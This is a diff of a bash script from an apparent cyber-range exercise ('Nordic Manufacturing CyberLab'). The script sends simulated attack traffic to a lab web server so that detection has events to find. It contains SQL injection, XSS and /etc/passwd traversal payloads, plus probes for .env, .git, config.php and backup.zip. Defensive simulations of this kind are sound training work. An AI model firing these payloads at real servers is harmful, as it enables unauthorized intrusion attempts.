@@ -2,273 +2,250 @@
 
 # ============================================================
 # Nordic Manufacturing A/S - Attack Simulation
-# Phase 02 - Web Application Attack
+# Phase 02 - Web Recon / Suspicious Web Activity
 #
-# Purpose:
-#   Generate controlled malicious-looking HTTP requests against
-#   a lab web server.
+# MANUAL:
+#   ./02-web.sh
 #
-# Evidence:
-#   - Web reconnaissance
-#   - Sensitive path enumeration
-#   - SQL injection attempts
-#   - XSS attempts
-#   - Directory traversal attempts
-#   - Suspicious User-Agent
-#
-# IMPORTANT:
-#   Intended for the Nordic Manufacturing CyberLab only.
+# AUTOMATIC:
+#   NORDIC_AUTO=1
+#   NORDIC_WEB_TARGET=192.168.1.20
+#   NORDIC_WEB_PORT=80
+#   ./02-web.sh
 # ============================================================
 
 set -u
 
-BASE_DIR="/opt/nordic-attack"
-LOG_DIR="$BASE_DIR/logs"
-
+LOG_DIR="/opt/nordic-attack/logs"
 mkdir -p "$LOG_DIR"
 
 TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
-LOGFILE="$LOG_DIR/web-$TIMESTAMP.log"
-GROUNDTRUTH="$LOG_DIR/incident-ground-truth.log"
+INCIDENT_ID="${NORDIC_INCIDENT_ID:-MANUAL-$TIMESTAMP}"
+LOG_FILE="$LOG_DIR/${INCIDENT_ID}-02-web.log"
 
-
-# ------------------------------------------------------------
-# Functions
-# ------------------------------------------------------------
-
-log_event() {
-    echo "$(date --iso-8601=seconds) | WEB | $1" >> "$GROUNDTRUTH"
-}
-
-banner() {
-    clear
-    echo "============================================================"
-    echo "       NORDIC MANUFACTURING - WEB ATTACK"
-    echo "============================================================"
-    echo
-}
-
-request() {
-
-    DESCRIPTION="$1"
-    URL="$2"
-
-    echo
-    echo "[*] $DESCRIPTION"
-    echo "    $URL"
-
-    log_event "$DESCRIPTION against $URL"
-
-    {
-        echo
-        echo "------------------------------------------------------------"
-        echo "$DESCRIPTION"
-        echo "URL: $URL"
-        echo "Time: $(date --iso-8601=seconds)"
-        echo "------------------------------------------------------------"
-
-        curl \
-            --path-as-is \
-            --connect-timeout 3 \
-            --max-time 8 \
-            -s \
-            -o /dev/null \
-            -w "HTTP %{http_code} | %{size_download} bytes | %{time_total}s\n" \
-            -A "Mozilla/5.0 NordicSecurityAudit/1.0" \
-            "$URL" || true
-
-    } >> "$LOGFILE" 2>&1
-
-    sleep 2
-}
-
-
-# ------------------------------------------------------------
-# Start
-# ------------------------------------------------------------
-
-banner
-
-echo "This simulation generates suspicious HTTP requests"
-echo "against a CyberLab web server."
+echo "======================================================"
+echo " Nordic Manufacturing - Phase 02: Web Activity"
+echo "======================================================"
 echo
 
-read -rp "Target IP: " TARGET
-
-if [[ -z "$TARGET" ]]; then
-    echo
-    echo "[ERROR] No target specified."
-    exit 1
-fi
-
-
 # ------------------------------------------------------------
-# Validate IPv4
+# Input - AUTO or MANUAL
 # ------------------------------------------------------------
 
-if ! [[ "$TARGET" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
-    echo
-    echo "[ERROR] Invalid IPv4 address."
-    exit 1
-fi
+if [[ "${NORDIC_AUTO:-0}" == "1" ]]; then
 
-IFS='.' read -r o1 o2 o3 o4 <<< "$TARGET"
-
-for octet in "$o1" "$o2" "$o3" "$o4"; do
-
-    if (( octet < 0 || octet > 255 )); then
-        echo
-        echo "[ERROR] Invalid IPv4 address."
+    if [[ -z "${NORDIC_WEB_TARGET:-}" ]]; then
+        echo "[ERROR] Automatic mode enabled but"
+        echo "        NORDIC_WEB_TARGET is not set."
         exit 1
     fi
 
-done
+    TARGET="$NORDIC_WEB_TARGET"
+    PORT="${NORDIC_WEB_PORT:-80}"
 
+    echo "[AUTO MODE]"
+    echo "Target : $TARGET"
+    echo "Port   : $PORT"
+
+else
+
+    echo "[MANUAL MODE]"
+
+    read -rp "Web target IP/hostname: " TARGET
+    read -rp "Web port [80]: " PORT
+
+    PORT="${PORT:-80}"
+
+fi
 
 # ------------------------------------------------------------
-# Port
+# Basic validation
 # ------------------------------------------------------------
 
-echo
-read -rp "Web port [80]: " PORT
-
-PORT=${PORT:-80}
-
-if ! [[ "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
-    echo
-    echo "[ERROR] Invalid TCP port."
+if [[ -z "$TARGET" ]]; then
+    echo "[ERROR] No target supplied."
     exit 1
 fi
 
+if ! [[ "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
+    echo "[ERROR] Invalid TCP port: $PORT"
+    exit 1
+fi
 
-BASE_URL="http://$TARGET:$PORT"
-
+if [[ "$PORT" == "443" ]]; then
+    BASE_URL="https://$TARGET:$PORT"
+    CURL_OPTS=(-k -s -o /dev/null)
+else
+    BASE_URL="http://$TARGET:$PORT"
+    CURL_OPTS=(-s -o /dev/null)
+fi
 
 echo
-echo "Target:"
+echo "[*] Incident ID : $INCIDENT_ID"
+echo "[*] Target      : $BASE_URL"
+echo "[*] Log         : $LOG_FILE"
 echo
-echo "    $BASE_URL"
-echo
-
-log_event "Web attack simulation started against $BASE_URL"
-
 
 {
-    echo "============================================================"
-    echo "Nordic Manufacturing - Web Attack"
-    echo "============================================================"
+    echo "Incident ID: $INCIDENT_ID"
+    echo "Phase: WEB"
+    echo "Timestamp: $(date --iso-8601=seconds)"
+    echo "Target: $TARGET"
+    echo "Port: $PORT"
     echo
-    echo "Time:   $(date --iso-8601=seconds)"
+} >> "$LOG_FILE"
+
+# ------------------------------------------------------------
+# Helper function
+# ------------------------------------------------------------
+
+send_request() {
+
+    local description="$1"
+    local path="$2"
+
+    echo "[>] $description"
+    echo "    GET $path"
+
+    STATUS=$(curl "${CURL_OPTS[@]}" \
+        -w "%{http_code}" \
+        --max-time 5 \
+        "$BASE_URL$path" 2>/dev/null || true)
+
+    [[ -z "$STATUS" ]] && STATUS="ERROR"
+
+    echo "    HTTP: $STATUS"
+    echo
+
+    {
+        echo "[$(date --iso-8601=seconds)]"
+        echo "$description"
+        echo "GET $path"
+        echo "HTTP=$STATUS"
+        echo
+    } >> "$LOG_FILE"
+
+    sleep 1
+}
+
+# ------------------------------------------------------------
+# Connectivity check
+# ------------------------------------------------------------
+
+echo "[1/5] Checking web service..."
+
+STATUS=$(curl "${CURL_OPTS[@]}" \
+    -w "%{http_code}" \
+    --max-time 5 \
+    "$BASE_URL/" 2>/dev/null || true)
+
+if [[ -z "$STATUS" || "$STATUS" == "000" ]]; then
+    echo "[!] Web service did not respond."
+    echo "[!] Continuing so the attempt is still documented."
+else
+    echo "[+] Web service responded with HTTP $STATUS"
+fi
+
+echo
+sleep 1
+
+# ------------------------------------------------------------
+# Normal browsing
+# ------------------------------------------------------------
+
+echo "[2/5] Generating normal-looking web traffic..."
+echo
+
+send_request \
+    "Requesting website root" \
+    "/"
+
+send_request \
+    "Requesting login page" \
+    "/login"
+
+# ------------------------------------------------------------
+# Suspicious SQL injection-looking requests
+# ------------------------------------------------------------
+
+echo "[3/5] Generating SQL injection indicators..."
+echo
+
+send_request \
+    "SQL injection-style request" \
+    "/login?username=admin%27%20OR%20%271%27=%271&password=test"
+
+send_request \
+    "SQL UNION-style request" \
+    "/search?q=%27%20UNION%20SELECT%20NULL,NULL--"
+
+# ------------------------------------------------------------
+# Suspicious XSS / traversal-looking requests
+# ------------------------------------------------------------
+
+echo "[4/5] Generating additional suspicious requests..."
+echo
+
+send_request \
+    "XSS-style request" \
+    "/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+
+send_request \
+    "Directory traversal-style request" \
+    "/download?file=../../../../etc/passwd"
+
+# ------------------------------------------------------------
+# Recon-style requests
+# ------------------------------------------------------------
+
+echo "[5/5] Checking common sensitive paths..."
+echo
+
+send_request \
+    "Requesting admin path" \
+    "/admin"
+
+send_request \
+    "Requesting configuration-looking file" \
+    "/config.php"
+
+send_request \
+    "Requesting backup-looking file" \
+    "/backup.zip"
+
+# ------------------------------------------------------------
+# Ground truth
+# ------------------------------------------------------------
+
+{
+    echo "=================================================="
+    echo "GROUND TRUTH"
+    echo "=================================================="
+    echo "Incident: $INCIDENT_ID"
+    echo "Phase: WEB"
     echo "Source: $(hostname)"
-    echo "Target: $BASE_URL"
+    echo "Target: $TARGET:$PORT"
     echo
-} >> "$LOGFILE"
-
-
-# ------------------------------------------------------------
-# Phase 1 - Normal request
-# ------------------------------------------------------------
-
-echo "[1/5] Initial web reconnaissance"
-
-request \
-    "Initial HTTP request" \
-    "$BASE_URL/"
-
-
-# ------------------------------------------------------------
-# Phase 2 - Sensitive path discovery
-# ------------------------------------------------------------
+    echo "Simulated activity:"
+    echo "- Normal web requests"
+    echo "- SQL injection indicators"
+    echo "- XSS indicator"
+    echo "- Directory traversal indicator"
+    echo "- Requests for potentially sensitive paths"
+    echo
+    echo "NOTE:"
+    echo "Requests are designed to generate observable"
+    echo "security events. This phase does not attempt"
+    echo "to modify the target or establish persistence."
+    echo "=================================================="
+} >> "$LOG_FILE"
 
 echo
-echo "[2/5] Searching for interesting web paths"
-
-PATHS=(
-    "admin"
-    "login"
-    "administrator"
-    "backup"
-    "config"
-    ".git"
-    ".env"
-    "robots.txt"
-)
-
-for PATHNAME in "${PATHS[@]}"; do
-
-    request \
-        "Sensitive path discovery: /$PATHNAME" \
-        "$BASE_URL/$PATHNAME"
-
-done
-
-
-# ------------------------------------------------------------
-# Phase 3 - SQL Injection simulation
-# ------------------------------------------------------------
-
+echo "======================================================"
+echo " Phase 02 complete"
+echo "======================================================"
 echo
-echo "[3/5] Generating SQL injection attempts"
-
-request \
-    "SQL injection attempt - authentication bypass" \
-    "$BASE_URL/login.php?username=admin%27%20OR%20%271%27%3D%271&password=test"
-
-request \
-    "SQL injection attempt - UNION SELECT" \
-    "$BASE_URL/index.php?id=1%20UNION%20SELECT%201,2,3"
-
-
-# ------------------------------------------------------------
-# Phase 4 - XSS simulation
-# ------------------------------------------------------------
-
-echo
-echo "[4/5] Generating XSS attempts"
-
-request \
-    "Cross-site scripting attempt" \
-    "$BASE_URL/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
-
-request \
-    "Cross-site scripting attempt - IMG event" \
-    "$BASE_URL/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
-
-
-# ------------------------------------------------------------
-# Phase 5 - Directory traversal simulation
-# ------------------------------------------------------------
-
-echo
-echo "[5/5] Generating directory traversal attempts"
-
-request \
-    "Directory traversal attempt - passwd" \
-    "$BASE_URL/../../../../etc/passwd"
-
-request \
-    "Encoded directory traversal attempt" \
-    "$BASE_URL/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-
-
-# ------------------------------------------------------------
-# Finish
-# ------------------------------------------------------------
-
-log_event "Web attack simulation completed against $BASE_URL"
-
-
-echo
-echo "============================================================"
-echo " Web attack simulation completed"
-echo "============================================================"
-echo
-echo "Target:"
-echo "  $BASE_URL"
-echo
-echo "Attack log:"
-echo "  $LOGFILE"
-echo
-echo "Ground truth:"
-echo "  $GROUNDTRUTH"
+echo "Target       : $TARGET:$PORT"
+echo "Incident ID  : $INCIDENT_ID"
+echo "Ground truth : $LOG_FILE"
 echo
